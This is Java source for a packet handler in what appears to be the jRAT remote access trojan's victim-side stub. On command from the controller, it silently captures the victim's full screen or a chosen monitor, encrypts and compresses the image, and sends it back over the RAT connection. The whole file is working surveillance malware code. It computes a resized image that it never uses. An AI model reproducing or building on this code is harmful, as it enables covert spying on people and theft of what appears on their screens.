package pro.jrat.stub.packets.incoming;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;

import pro.jrat.common.compress.GZip;
import pro.jrat.common.crypto.Crypto;
import pro.jrat.stub.Connection;
import pro.jrat.stub.Main;
import pro.jrat.stub.packets.outgoing.Packet68QuickDesktop;
import pro.jrat.stub.utils.ImageUtils;


public class Packet98QuickDesktop extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int width = Connection.readInt();
		int height = Connection.readInt();
		
		int monitor = Connection.readInt();
		
		BufferedImage image = null;
		Rectangle screenBounds = null;
		
		if (monitor == -1) {
			screenBounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			image = new Robot().createScreenCapture(screenBounds);
		} else {
			GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[monitor];
			Robot robotForScreen = new Robot(screen);  		
			screenBounds = screen.getDefaultConfiguration().getBounds();  
			screenBounds.x = 0;
			screenBounds.y = 0;
			image = robotForScreen.createScreenCapture(screenBounds);
		}
		
		BufferedImage resized = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
		resized.getGraphics().drawImage(image, 0, 0, width, height, null);
		
		byte[] buffer = GZip.compress(Crypto.encrypt(ImageUtils.encodeImage(image, 0.1F), Main.getKey()));
		
		Connection.addToSendQueue(new Packet68QuickDesktop(buffer));		
		
		System.gc();
	}

}
